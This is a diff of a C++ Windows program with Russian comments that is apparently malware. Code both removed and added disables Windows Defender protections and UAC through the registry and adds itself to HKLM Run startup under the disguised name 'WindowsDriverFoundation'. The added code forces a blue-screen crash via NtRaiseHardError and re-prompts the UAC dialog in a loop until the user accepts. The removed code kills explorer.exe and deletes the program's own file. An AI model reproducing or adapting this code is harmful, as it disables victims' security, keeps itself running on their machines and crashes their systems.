@@ -1,45 +1,26 @@
 #pragma once
 #include "include.h"
 bool isUserAdmin() {
-    BOOL isAdmin = FALSE; // проверка на права администратора 
-    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
-    PSID AdministratorsGroup;
+    BOOL isAdminFlag = FALSE;
+    BYTE adminSid[SECURITY_MAX_SID_SIZE]; // Буфер для хранения SID
+    DWORD sidSize = sizeof(adminSid);
 
-    if (!AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdministratorsGroup)) {
-        return false;
-    }
-    if (!CheckTokenMembership(NULL, AdministratorsGroup, &isAdmin)) {
-        FreeSid(AdministratorsGroup);
-        return false;
-    }
-    FreeSid(AdministratorsGroup);
-    return isAdmin != FALSE;
+    if (!CreateWellKnownSid(WinBuiltinAdministratorsSid, NULL, &adminSid, &sidSize)) return false;
+    if (!CheckTokenMembership(NULL, &adminSid, &isAdminFlag)) return false;
+    return isAdminFlag != FALSE;
 }   
 void DefenderOwner(){
-    HKEY key;
-    HKEY new_key;
-    DWORD disable = 1;  // убийство Windows Defender вроде работает и на 11
-    LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_ALL_ACCESS, &key);
-    if (res == ERROR_SUCCESS) {
-        RegSetValueEx(key, "DisableAntiSpyware", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
-        RegCreateKeyEx(key, "Real-Time Protection", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &new_key, 0);
-        RegSetValueEx(new_key, "DisableRealtimeMonitoring", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
-        RegSetValueEx(new_key, "DisableBehaviorMonitoring", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
-        RegSetValueEx(new_key, "DisableScanOnRealtimeEnable", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
-        RegSetValueEx(new_key, "DisableOnAccessProtection", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
-        RegSetValueEx(new_key, "DisableIOAVProtection", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
+    // Отключение Defender
+    system("REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f");
 
-        RegCloseKey(key);
-        RegCloseKey(new_key);
-    }
-    LONG uacRes = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_ALL_ACCESS, &key);
-    if (uacRes == ERROR_SUCCESS) {
-        DWORD uacDisable = 0;  // Устанавливаем значение для отключения UAC
-        RegSetValueEx(key, "EnableLUA", 0, REG_DWORD, (const BYTE*)&uacDisable, sizeof(uacDisable));
-        RegCloseKey(key);
-        std::cout << "UAC has been disabled." << std::endl;
-    }
-    std::cout << "All done." << std::endl;
+    system("REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f");
+    system("REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f");
+    system("REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f");
+    system("REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f");
+    system("REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableIOAVProtection /t REG_DWORD /d 1 /f");
+
+    // Отключение UAC
+    system("REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v EnableLUA /t REG_DWORD /d 0 /f");
 }
 bool checkAndCreateFile(const std::string& filename) {
     std::string fullPath = "C:\\Windows\\SysWOW64\\" + filename; // Файл-чекпоинт создается только один раз
@@ -54,38 +35,38 @@ bool checkAndCreateFile(const std::string& filename) {
             return 0;
         }
     }
+    return 0;
 }
 void addToStartup() {
     char path[MAX_PATH];
-
     // Получаем путь к текущему исполняемому файлу
     GetModuleFileName(NULL, path, MAX_PATH);
+    
+    // Добавление в реестр для автозагрузки
+    std::cout << "Adding to startup..." << std::endl;
+    std::string command = "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WindowsDriverFoundation /t REG_SZ /d \"" + std::string(path) + "\" /f";
+    system(command.c_str());
+    std::cout << "Added to startup successfully." << std::endl;
+}
+void reset() {  // краш системы 
+	// Try to force **BSOD** first
+	// I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
+	// This isn't even an exploit, it's just an undocumented feature.
+    HMODULE ntdll = LoadLibraryA("ntdll");
+    FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
+    FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");
 
-    HKEY hKey;
-    LONG result = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
-        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
-        0, KEY_SET_VALUE, &hKey);
-
-    if (result != ERROR_SUCCESS) {
-        std::cerr << "No adm." << std::endl;
-        return;
-    }
-
-    result = RegSetValueExA(hKey, "WindowsDriverFoundation", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
-    RegCloseKey(hKey);
-
-    if (result == ERROR_SUCCESS) {
-        std::cout << "Done!" << std::endl;
-    }
-    else {
-        std::cerr << "Err!" << std::endl;
+    if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
+        BOOLEAN tmp1; DWORD tmp2;
+        ((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
+        ((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0294823, 0, 0, 0, 6, &tmp2);
     }
 }
-void restartSystem() {
+void restartSystem() {  // запасная функция взял ее с форума
     std::cout << "restarting" << std::endl;
 
     // меньше нельзя ставить иначе не все изменения реестра сохраняются на слабых пк
-    std::this_thread::sleep_for(std::chrono::seconds(5));
+    Sleep(1500);
 
     // Перезагрузка системы
     HANDLE hToken;
@@ -117,34 +98,22 @@ void restartSystem() {
 void restartAsAdmin() {
     char path[MAX_PATH];
     GetModuleFileNameA(NULL, path, MAX_PATH);
-
+  
     SHELLEXECUTEINFOA sei = { sizeof(sei) };
-    sei.lpVerb = "runas";
+    sei.lpVerb = "runas"; // Запрос UAC
     sei.lpFile = path;
+    sei.hwnd = NULL;
     sei.nShow = SW_SHOWNORMAL;
-
+  
     if (!ShellExecuteExA(&sei)) {
-        std::cerr << "Ошибка запуска от имени администратора!" << std::endl;
+        DWORD err = GetLastError();
+        if (err == ERROR_CANCELLED) {
+            // Пользователь нажал "Нет", повторяем запуск
+            Sleep(2000); // Ждём перед повтором
+            restartAsAdmin();
+        }
     }
-}
-void stopExplorer() {
-    // Поиск процесса explorer.exe не обязательная функцияя так как есть поток который в фоне все закрывает
-    PROCESS_INFORMATION pi;
-    STARTUPINFO si;
-    ZeroMemory(&si, sizeof(si));
-    ZeroMemory(&pi, sizeof(pi));
-
-    // Запускаем команду taskkill для завершения explorer.exe
-    if (CreateProcess(NULL, (LPSTR)"taskkill /F /IM explorer.exe", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
-        WaitForSingleObject(pi.hProcess, INFINITE); // Ждем завершения процесса
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-        std::cout << "Explorer.exe has been stopped." << std::endl;
-    }
-    else {
-        std::cerr << "Failed to stop explorer.exe." << std::endl;
-    }
-}
+  }
 bool copyAndRunSelf() {
     // Путь к текущему исполняемому файлу
     char path[MAX_PATH];
@@ -173,13 +142,5 @@ bool copyAndRunSelf() {
         std::cout << "Успешно запущена копия программы." << std::endl;
         return 1;
     }
-}
-void deleteSelf() {
-    // путь 
-    char path[MAX_PATH];
-    GetModuleFileName(NULL, path, MAX_PATH);
-
-    // Создаем команду для удаления себя с использованием командной строки
-    std::string command = "cmd /c timeout /t 1 & del \"" + std::string(path) + "\"";
-    // не уверен что это работает
+    return 1;
 }
